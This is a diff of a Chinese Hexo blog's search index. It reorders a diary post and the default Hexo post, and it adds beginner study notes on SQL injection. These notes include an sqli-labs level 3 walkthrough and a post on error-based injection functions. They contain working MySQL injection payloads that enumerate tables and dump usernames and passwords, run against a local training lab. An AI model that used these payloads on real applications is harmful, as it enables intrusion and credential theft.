@@ -54,6 +54,30 @@
       </tags>
   </entry>
   <entry>
+    <title>惜</title>
+    <url>/2022/11/06/Diary_1106/</url>
+    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
+<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
+<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
+<li>上午9点体测，跳远和引体向上。排队等了一个小时。</li>
+<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
+<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
+<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入之字符型和数字型判断</title>
     <url>/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习SQL注入，应当对SQL语句较为熟悉，否则会比较懵。</p>
@@ -101,30 +125,6 @@
       </tags>
   </entry>
   <entry>
-    <title>惜</title>
-    <url>/2022/11/06/Diary_1106/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
-<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
-<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
-<li>上午9点体测，跳远和引体向上。排队等了一个小时。</li>
-<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
-<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
-<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>First Blog</title>
     <url>/2022/11/03/first_blog/</url>
     <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
@@ -166,26 +166,6 @@
         <tag>随想</tag>
         <tag>搭建博客</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2022/11/03/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>SQL注入之sqli-labs_1+2</title>
@@ -262,6 +242,26 @@
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2022/11/03/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<span id="more"></span>
+
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>sqli-labs_4</title>
     <url>/2022/11/08/sqli-labs_4/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
@@ -285,6 +285,42 @@
 <h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
 <li>此笔记为笔者初学sql注入时所写</li>
 <li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
+</ul>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_3</title>
+    <url>/2022/11/08/sqli-labs_3/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
+</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
+<ol start="3">
+<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
+<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
+<li>此笔记为笔者初学sql注入时所写</li>
+<li>本关重点在于通过报错信息判断sql语句</li>
 </ul>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
 ]]></content>
@@ -411,39 +447,74 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_3</title>
-    <url>/2022/11/08/sqli-labs_3/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p>
-</li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li>
+    <title>报错注入常用函数</title>
+    <url>/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p>
+<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ol>
+<li>格式<br>updatexml(XML_document,XPath_string,new_value)</li>
 </ol>
-<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
-<ol start="3">
-<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
-<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
-<li>此笔记为笔者初学sql注入时所写</li>
-<li>本关重点在于通过报错信息判断sql语句</li>
+<ul>
+<li>XML_document: xml标记</li>
+<li>XPath_string: 显示输入语句</li>
+<li>new_value: 新值</li>
 </ul>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+<ol start="2">
+<li>原理<br>updatexml()函数是MySQL对XML文档数据进行查询和修改的XPATH函数：</li>
+</ol>
+<ul>
+<li>xml:可扩展语言</li>
+<li>update():函数更新</li>
+<li>组合，具有查询功能的函数，用于查询xpath<br>利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到查询内容的目的</li>
+</ul>
+<ol start="3">
+<li>示例<br>updatexml(1,concat(0x7e,(select database()),0x7e),1)</li>
+</ol>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ol>
+<li><p>格式<br>extractvalue(XML_document,XPath_string):<br>XML_document是string格式，为XML文档对象的名称<br>XPath_string(Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串</p>
+</li>
+<li><p>原理</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a/b&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>该语句是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误，就会报错</p>
+</li>
+</ol>
+<ul>
+<li>输出字符长度限制为32个字符</li>
+</ul>
+<ol start="3">
+<li>示例<br>extractvalue(1,concat(0x7e,(select database())))</li>
+</ol>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><ol>
+<li>格式<br>and (select 1 from (select count(*),concat(payload,floor(rand(0)*2))x from information_schema.tables group by x)a)</li>
+</ol>
+<ul>
+<li>payload是需要插入sql注入语句的位置</li>
+<li>floor():去除小数部分</li>
+<li>rand():产生随机数</li>
+<li>rand(x):每个x对应一个固定的值，连续执行多次值会变化，但可预测，序列为011011…</li>
+<li>count():count(*)函数返回表中的记录数</li>
+<li>适用版本：5.0 &lt; MySQL &lt; 8.x</li>
+</ul>
+<ol start="2">
+<li><p>原理<br>利用数据库表主键不能重复的原理，使用group by分组，产生主键key冗余，导致报错<br>详细解释：<a href="https://blog.csdn.net/qq_43504939/article/details/90046342">SQL注入:floor()报错注入</a></p>
+</li>
+<li><p>示例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><p><a href="https://blog.csdn.net/qq_43238111/article/details/106205125">报错注入常用函数</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/GTL-JU/p/16054806.html">报错注入常用的三种注入方式</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/weixin_46706771/article/details/112768348">MYSQL 通过ExtractValue()报错注入</a></p>
+</li>
+</ul>
 ]]></content>
       <categories>
         <category>SQL注入</category>
-        <category>sqli-labs</category>
+        <category>报错注入</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
       </tags>
   </entry>
 </search>
